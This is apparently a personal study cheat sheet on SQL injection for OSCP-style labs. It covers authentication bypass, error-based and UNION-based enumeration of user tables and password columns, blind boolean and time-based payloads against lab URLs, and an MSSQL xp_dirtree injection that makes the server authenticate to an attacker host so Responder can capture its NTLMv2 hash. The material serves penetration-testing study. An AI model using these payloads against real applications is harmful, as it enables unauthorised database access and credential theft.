Broad overview:
```
SQLi Types
	In-band
		Union based
		error based
	Blind
		Boolean Based
		Time Based
	Out-Of-Band
```

On input forms (example: login page), they are often performing sql expressions in the backend

Example of a login form POST
	user: admin
	pass: admin
`SELECT * FROM users WHERE user='admin' AND password = 'admin';
	this is occurring in the background
	the AND makes it where user=admin and pass=admin must both exist in the database to be TRUE and authenticate

SQLi is abusing this.

we use ', --, OR, UNION, etc... to interrupt the sql query. if not properly sanitized, we can be BAD

[_sqlmap_](http://sqlmap.org/)
	automated tool to abuse SQLi
	no allowed on OSCP

___
#### [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

## Discovery:
Test EVERY input form on web app (each POST form)
Error Based
	'
		look for errors
		if successful, try auth bypass on login forms and enumerate

## Auth Bypass:
```
Use with login forms to bypass authentication.

Still requires CORRECT user (it basically disregards the password)
```

Auth Bypass with OR operator
	`<user>' or '1'='1

Auth Bypass with comments
	`<user>'--

Some more examples
	`' OR 1=1 -- //
	
## Enumerate:
#### In-band:
Start here
Error based:
	`' or 1=1 in (select @@version) -- //
		retrieve version
	`' or 1=1 in (SELECT * FROM users) -- //
		retrieve all from users
		might return errors (too many columns)
	`' or 1=1 in (SELECT password FROM users) -- //`
		1 column only
	`' of 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
		further specifics

Union based:
```
Requirements

UNION query must include same numer of columns as the original

data types need to be compatible between each column
```

Verify exact number of columns
	`'ORDER BY 1-- //`
		might not work
	`'UNION select 1,2,3,4 -- //`
		add/subtract until you get output
		-1 from that and that is the total columns
			ie: 1,2,3 = 2 columns

Enumerate database
	`%' UNION SELECT database(), user(), @@version, null, null -- //
		replace columns as you want
		% is required to stay in 
	`' UNION SELECT null, null, database(), user(), @@version  -- //`
		can omit %

Explore another table
	`' UNION SELECT null, username, password, description, null FROM users -- //

Verify if other tables are present in the current database
	enumerate information schema
	`' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //


#### Blind SQLi:
```
If you see this, realistically you would need a script of some sort to exploit it...

ie: sqlmap
```
Boolean SQLi
	example app takes user parameter as input
	`http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
		will return values only if the user is present in the database
		we could enumerate the entire database for other usernames

Time-based SQLi
	`http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
		if user is present, the app will HANG for about 3 seconds

## MSSQL
If MSSQL is present as well, you can try a SQLi that will try to authenticate to you and capture their Net-NTLMv2 hash (See [[MSSQL]] for background info)

Query
```bash
sudo responder -I tun0

# Add this you your injection point
; EXEC master ..xp_dirtree '\\<attack_ip>\test'; --

# Capture and crack hash (see MSSQL page)
```


___
#### NOTE:
```
if sqli probing gives an ERROR, then you perform a command but get invalid creds or no return, that does NOT mean SQLi is necessarily failing.
	EXAMPLE
	'
		leads to error
	' or 1=1 in (select @@version) -- //
		error
	'select @@version; -- //
		invalid creds
		this means it may be accepting it
```

